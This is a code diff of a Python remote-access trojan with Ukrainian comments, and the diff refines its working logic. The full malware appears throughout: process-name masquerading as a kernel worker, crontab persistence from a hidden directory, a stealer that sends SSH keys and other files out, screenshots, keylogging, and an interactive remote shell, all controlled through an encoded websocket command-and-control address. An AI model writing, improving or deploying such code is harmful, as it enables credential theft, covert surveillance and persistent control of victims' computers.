@@ -9,7 +9,7 @@ import shutil
 import glob
 from io import BytesIO
 
-# Спроба маскування
+# Спроба імпорту модулів для маскування та додаткових функцій
 try: import setproctitle
 except: setproctitle = None
 try: from PIL import ImageGrab
@@ -17,13 +17,13 @@ except: ImageGrab = None
 try: from pynput import keyboard
 except: keyboard = None
 
-# Налаштування
+# Конфігурація
 _S = "d3M6Ly8xOTIuMTY4LjEwLjgyOjgwMDAvd3Mv" 
 X_KEY = "AMY_2026_SECRET"
 FAKE_NAME = "[kworker/u2:1-events]"
 log_buffer = []
 
-# Поточна робоча директорія для Shell
+# Глобальна змінна для збереження поточної директорії
 current_dir = os.getcwd()
 
 def get_url(): return base64.b64decode(_S).decode()
@@ -39,6 +39,7 @@ def decrypt(m):
 def encrypt(m): return base64.b64encode(crypt_logic(m).encode()).decode()
 
 def masquerade():
+    """Маскування назви процесу в системі"""
     if setproctitle: setproctitle.setproctitle(FAKE_NAME)
     else:
         try:
@@ -48,24 +49,32 @@ def masquerade():
         except: pass
 
 def ghost_install():
+    """Автоматичне закріплення (Persistence)"""
     try:
         target_dir = os.path.expanduser("~/.local/share/systemd-service")
         target_path = os.path.join(target_dir, "sys-update")
         current_path = os.path.abspath(sys.argv[0])
+        
         if current_path != target_path:
             os.makedirs(target_dir, exist_ok=True)
             shutil.copy2(current_path, target_path)
             os.chmod(target_path, 0o755)
+            
+            # Додавання в crontab
             cron_cmd = f"*/2 * * * * {target_path} > /dev/null 2>&1"
             current_cron = subprocess.run("crontab -l", shell=True, capture_output=True, text=True).stdout
             if target_path not in current_cron:
-                new_cron = current_cron + f"\n{cron_cmd}\n"
-                subprocess.Popen("crontab -", stdin=subprocess.PIPE, shell=True).communicate(input=new_cron.encode())
+                new_cron = current_cron.strip() + f"\n{cron_cmd}\n"
+                process = subprocess.Popen("crontab -", stdin=subprocess.PIPE, shell=True)
+                process.communicate(input=new_cron.encode())
+            
+            # Запуск дубліката та вихід
             subprocess.Popen([target_path], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
             sys.exit(0)
     except: pass
 
 async def steal_mode(ws):
+    """Стілер SSH ключів та конфіденційних файлів"""
     home = os.path.expanduser("~")
     data_targets = [
         ("ssh", os.path.join(home, ".ssh", "*")),
@@ -80,10 +89,12 @@ async def steal_mode(ws):
                 try:
                     if os.path.getsize(fpath) < 1000000:
                         with open(fpath, "rb") as f:
-                            b64 = base64.b64encode(f.read()).decode()
-                            await ws.send(encrypt(f"STEAL_DATA:{data_type}:{os.path.basename(fpath)}:{b64}"))
-                            stolen_count += 1
-                            await asyncio.sleep(0.2)
+                            content = f.read()
+                            if content:
+                                b64 = base64.b64encode(content).decode()
+                                await ws.send(encrypt(f"STEAL_DATA:{data_type}:{os.path.basename(fpath)}:{b64}"))
+                                stolen_count += 1
+                                await asyncio.sleep(0.1)
                 except: pass
     return stolen_count
 
@@ -98,23 +109,25 @@ if keyboard:
     except: pass
 
 async def run_shell(command):
-    """Виконує команду та зберігає стан робочої директорії"""
+    """Інтерактивний шелл з виправленою логікою переходу між папками"""
     global current_dir
     try:
-        # Спеціальна обробка команди cd
+        command = command.strip()
+        
+        # Обробка CD (зміна директорії)
         if command.startswith("cd "):
-            new_path = command[3:].strip()
-            # Обробка шляху відносно поточної директорії
-            potential_path = os.path.join(current_dir, new_path)
-            if os.path.isdir(potential_path):
-                current_dir = os.path.abspath(potential_path)
-            elif os.path.isdir(new_path):
-                current_dir = os.path.abspath(new_path)
+            path = command[3:].strip()
+            new_path = os.path.abspath(os.path.join(current_dir, path))
+            if os.path.isdir(new_path):
+                current_dir = new_path
+                os.chdir(current_dir) # Фізична зміна для процесу Python
+                return f"Changed directory to: {current_dir}"
             else:
-                return f"cd: no such file or directory: {new_path}"
-            return f"Changed directory to: {current_dir}"
+                return f"Error: {path} is not a directory"
 
-        # Виконання інших команд
+        # Синхронізація поточної директорії ОС перед виконанням будь-якої команди
+        os.chdir(current_dir)
+        
         process = await asyncio.create_subprocess_shell(
             command,
             stdout=asyncio.subprocess.PIPE,
@@ -122,17 +135,21 @@ async def run_shell(command):
             cwd=current_dir
         )
         stdout, stderr = await process.communicate()
-        result = stdout.decode().strip() or stderr.decode().strip()
         
-        # Додаємо маркер поточної директорії для зручності
-        user_info = f"\n[{os.getlogin()}@{uuid.getnode()}:{current_dir}]$ "
-        return result + user_info
+        output = stdout.decode().strip() or stderr.decode().strip()
+        if not output and process.returncode == 0:
+            output = "Command executed successfully."
+            
+        # Формування промпту з реальною адресою
+        prompt = f"\n[AMY-SHELL] {os.getlogin()}@{uuid.getnode()}:{os.getcwd()}$ "
+        return output + prompt
     except Exception as e:
         return f"Shell Error: {str(e)}"
 
 async def start():
     masquerade()
     ghost_install()
+    
     b_id = f"bot_{hex(uuid.getnode())[2:10]}"
     
     while True:
@@ -140,16 +157,16 @@ async def start():
             async with websockets.connect(get_url() + b_id) as ws:
                 while True:
                     m = await ws.recv()
-                    cmd = decrypt(m)
-                    if not cmd: continue
-                    cmd = cmd.strip()
+                    raw_cmd = decrypt(m)
+                    if not raw_cmd: continue
+                    cmd = raw_cmd.strip()
                     
                     if cmd == "screenshot":
                         if ImageGrab:
                             buf = BytesIO()
                             ImageGrab.grab().save(buf, format="PNG")
                             await ws.send(encrypt(f"SCREENSHOT:{base64.b64encode(buf.getvalue()).decode()}"))
-                        else: await ws.send(encrypt("Error: No ImageGrab"))
+                        else: await ws.send(encrypt("Error: PIL not installed"))
                     
                     elif cmd == "steal":
                         await ws.send(encrypt("SYS_MSG: Stealer initiated..."))
@@ -163,7 +180,7 @@ async def start():
                     
                     elif cmd.startswith("download "):
                         path = cmd[9:].strip()
-                        abs_path = os.path.join(current_dir, path) if not os.path.isabs(path) else path
+                        abs_path = os.path.abspath(os.path.join(current_dir, path))
                         if os.path.exists(abs_path) and os.path.isfile(abs_path):
                             with open(abs_path, "rb") as f:
                                 b64 = base64.b64encode(f.read()).decode()
@@ -176,10 +193,10 @@ async def start():
                         os._exit(0)
 
                     else:
-                        # Все інше йде в інтерактивний Shell
                         response = await run_shell(cmd)
                         await ws.send(encrypt(response))
-        except: await asyncio.sleep(5)
+        except Exception:
+            await asyncio.sleep(5)
 
 if __name__ == "__main__":
     asyncio.run(start())
